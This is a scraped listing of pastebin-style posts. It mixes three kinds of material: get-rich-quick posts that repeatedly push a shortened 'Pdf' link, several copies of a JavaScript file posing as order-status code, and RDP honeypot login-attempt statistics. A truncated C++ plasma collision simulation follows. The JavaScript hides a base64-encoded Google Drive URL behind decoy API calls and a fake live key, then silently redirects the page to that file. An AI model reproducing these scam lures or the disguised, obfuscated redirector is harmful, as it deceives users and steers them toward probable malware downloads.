id,title,username,language,date,content
HFahBHSs,Make $1000 15-MINUTES  (BEGINNER) HV,Fareswww511,JavaScript,Wednesday 16th of April 2025 07:20:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


imHT0oi63o
"
zPP7StAM,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 07:18:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z6D3U676,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:18:15 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 453,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 486,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 486,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 486,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 453,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 489,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7839,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8103
  },
  ""client_build"": {
    ""Unknown"": 8103
  },
  ""client_name"": {
    ""Unknown"": 8103
  },
  ""ip_type"": {
    ""Unknown"": 660,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
eBM4Ac2a,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 452,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 485,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 485,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 485,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 452,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 488,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7838,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8102
  },
  ""client_build"": {
    ""Unknown"": 8102
  },
  ""client_name"": {
    ""Unknown"": 8102
  },
  ""ip_type"": {
    ""Unknown"": 659,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
FFA19xba,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 451,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 484,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 484,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 484,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 451,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 487,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7837,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8101
  },
  ""client_build"": {
    ""Unknown"": 8101
  },
  ""client_name"": {
    ""Unknown"": 8101
  },
  ""ip_type"": {
    ""Unknown"": 658,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
b0ktqQ5e,EARN $900 INSTANTLY 2025 2U,Fareswww511,JavaScript,Wednesday 16th of April 2025 07:06:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


6DB6jQzzfp
"
LXiVTXkz,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 07:03:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87882/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pPhayjbK,Make $1000 15-MINUTES (BEGINNER) FM,Fareswww511,JavaScript,Wednesday 16th of April 2025 06:53:19 PM CDT," 
Pdf https://tinyurl.com/privguidee


iYvLvDRKup
"
yfHCQkCW,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 06:47:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EDGQNJgP,EARN $900 INSTANTLY 2025⭐ G8,Fareswww511,JavaScript,Wednesday 16th of April 2025 06:39:52 PM CDT," 
Pdf https://tinyurl.com/privguidee


uOEQmKoMP6
"
WKFTNsfc,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 06:32:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66667/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RLckEKuQ,Make $1000 15-MINUTES  (BEGINNER) HV,Fareswww511,JavaScript,Wednesday 16th of April 2025 06:26:29 PM CDT," 
Pdf https://tinyurl.com/privguidee


R7swwaUsT8
"
kyrK8ePa,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 06:16:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03864/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9SwicrpP,superelastic+field_heating(anomaluos heating not solved),phystota,C++,Wednesday 16th of April 2025 06:04:52 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state

// simulation parameters

#define n_e 50000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 5.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 4000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 3.0E-2 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.01 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 1000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
